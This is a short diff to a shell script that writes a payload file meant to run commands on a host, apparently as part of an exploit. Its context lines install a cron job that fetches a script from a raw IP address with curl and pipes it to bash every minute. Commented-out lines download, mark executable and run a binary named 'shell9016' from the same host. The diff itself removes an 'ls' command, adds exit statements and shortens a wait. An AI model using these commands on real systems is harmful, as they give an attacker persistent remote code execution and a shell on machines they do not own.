@@ -16,7 +16,6 @@ cat > ${PAYLOAD_PATH} << __EOF__
 OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
 # Commands to run on the host<
 
-ls -la > \${OUTPATH} 2>&1
 #wget http://20.98.115.108:9002/shell9016 -O shell9016
 #chmod +x ./shell9016 >> \${OUTPATH} 2>&1
 #./shell9016 >> \${OUTPATH} 2>&1
@@ -24,7 +23,7 @@ crontab -l > mycron >> \${OUTPATH} 2>&1
 echo "* * * * * curl http://20.98.115.108:9002/run | bash" >> mycron
 crontab mycron >> \${OUTPATH} 2>&1
 crontab -l >> \${OUTPATH} 2>&1
-
+exit 0
 
 
 __EOF__
@@ -55,6 +54,7 @@ do
   TPID=$((${TPID} + 1))
 done
 # Wait for and cat the output
-sleep 120
+sleep 3
 echo "output from script commands"
 cat ${OUTPUT_PATH}
+exit 0
